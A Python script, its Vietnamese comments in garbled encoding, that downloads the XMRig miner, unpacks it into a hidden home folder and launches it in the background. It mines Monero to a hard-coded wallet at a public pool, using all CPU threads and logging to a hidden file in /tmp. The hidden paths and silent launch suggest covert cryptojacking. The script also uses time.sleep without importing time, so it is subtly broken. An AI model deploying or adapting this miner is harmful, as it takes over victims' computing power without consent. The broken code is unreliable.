import os
import subprocess
import sys
import urllib.request
import tarfile

# ========= C·∫•u h√¨nh =========
POOL = "pool.hashvault.pro:443"
WALLET = "85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz"
WORKER = f"worker-{os.uname()[1]}"
CPU_THREADS = os.cpu_count()
LOG_FILE = "/tmp/.xmrig_hidden.log"
INSTALL_DIR = os.path.expanduser("~/.xmrig")
XMRIG_VERSION = "6.21.1"
XMRIG_URL = f"https://github.com/xmrig/xmrig/releases/download/v{XMRIG_VERSION}/xmrig-{XMRIG_VERSION}-linux-x64.tar.gz"

# ========= H√†m T·∫£i v√† Gi·∫£i N√©n XMRig =========
def download_and_extract_xmrig():
    print("üöÄ ƒêang t·∫£i v√† gi·∫£i n√©n XMRig...")
    
    # T·∫£i XMRig
    try:
        download_path = os.path.join(INSTALL_DIR, "xmrig.tar.gz")
        urllib.request.urlretrieve(XMRIG_URL, download_path)
        print(f"‚úÖ T·ªáp ƒë√£ t·∫£i v·ªÅ: {download_path}")
    except Exception as e:
        print(f"‚ùå L·ªói t·∫£i t·ªáp: {e}")
        sys.exit(1)

    # Gi·∫£i n√©n t·ªáp XMRig
    try:
        with tarfile.open(download_path, "r:gz") as tar:
            tar.extractall(path=INSTALL_DIR)
        print(f"‚úÖ Gi·∫£i n√©n XMRig th√†nh c√¥ng.")
    except Exception as e:
        print(f"‚ùå L·ªói gi·∫£i n√©n t·ªáp: {e}")
        sys.exit(1)

# ========= H√†m Ch·∫°y XMRig =========
def run_xmrig():
    print("üõ†Ô∏è ƒêang kh·ªüi ƒë·ªông XMRig...")

    # Ki·ªÉm tra th∆∞ m·ª•c gi·∫£i n√©n v√† l·∫•y t√™n th∆∞ m·ª•c
    extracted_dir = None
    for item in os.listdir(INSTALL_DIR):
        if item.startswith("xmrig-") and os.path.isdir(os.path.join(INSTALL_DIR, item)):
            extracted_dir = os.path.join(INSTALL_DIR, item)
            break
    
    if not extracted_dir:
        print(f"‚ùå Kh√¥ng t√¨m th·∫•y th∆∞ m·ª•c gi·∫£i n√©n trong {INSTALL_DIR}.")
        sys.exit(1)
    
    # Ki·ªÉm tra t·ªáp xmrig c√≥ t·ªìn t·∫°i kh√¥ng
    xmrig_path = os.path.join(extracted_dir, "xmrig")
    if not os.path.exists(xmrig_path):
        print(f"‚ùå Kh√¥ng t√¨m th·∫•y t·ªáp xmrig ·ªü ƒë∆∞·ªùng d·∫´n {xmrig_path}.")
        sys.exit(1)

    # T·∫°o th∆∞ m·ª•c log n·∫øu kh√¥ng t·ªìn t·∫°i
    log_dir = os.path.dirname(LOG_FILE)
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)

    # Ch·∫°y XMRig v·ªõi c√°c tham s·ªë c·∫•u h√¨nh, s·ª≠ d·ª•ng nohup ƒë·ªÉ ch·∫°y trong n·ªÅn
    try:
        subprocess.Popen(
            [xmrig_path, '-o', POOL, '-u', WALLET + '.' + WORKER, '--coin', 'monero', '--cpu-priority', '3', '--threads', str(CPU_THREADS), '--max-cpu-usage', '75', '--donate-level', '1', '--log-file', LOG_FILE],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        print(f"‚úÖ ƒêang ƒë√†o Monero, ti·∫øn tr√¨nh ƒëang ch·∫°y ng·∫ßm.")
        print(f"üìÇ Log: {LOG_FILE}")
    except Exception as e:
        print(f"‚ùå L·ªói khi kh·ªüi ƒë·ªông XMRig: {e}")
        sys.exit(1)

# ========= Main =========
def main():
    # Ki·ªÉm tra v√† t·∫°o th∆∞ m·ª•c c√†i ƒë·∫∑t n·∫øu kh√¥ng t·ªìn t·∫°i
    if not os.path.exists(INSTALL_DIR):
        os.makedirs(INSTALL_DIR)

    # T·∫£i v√† gi·∫£i n√©n XMRig
    download_and_extract_xmrig()

    # Ch·∫°y XMRig
    run_xmrig()

    # Ki·ªÉm tra log ƒë·ªÉ ƒë·∫£m b·∫£o qu√° tr√¨nh ƒëang ch·∫°y
    print(f"üìÇ ƒêang theo d√µi log t·∫°i {LOG_FILE}")
    try:
        # ƒê·ª£i m·ªôt ch√∫t tr∆∞·ªõc khi ƒë·ªçc log
        print("ƒêang ƒë·ª£i ƒë·ªÉ log ƒë∆∞·ª£c t·∫°o...")
        for _ in range(10):  # ƒê·ª£i 10 gi√¢y ƒë·ªÉ log ƒë∆∞·ª£c ghi
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, "r") as log_file:
                    print(log_file.read())
                break
            time.sleep(1)  # Delay m·ªôt gi√¢y v√† th·ª≠ l·∫°i
        else:
            print(f"‚ùå Kh√¥ng th·ªÉ t√¨m th·∫•y t·ªáp log sau 10 gi√¢y.")
    except Exception as e:
        print(f"‚ùå Kh√¥ng th·ªÉ ƒë·ªçc log: {e}")

if __name__ == "__main__":
    main()
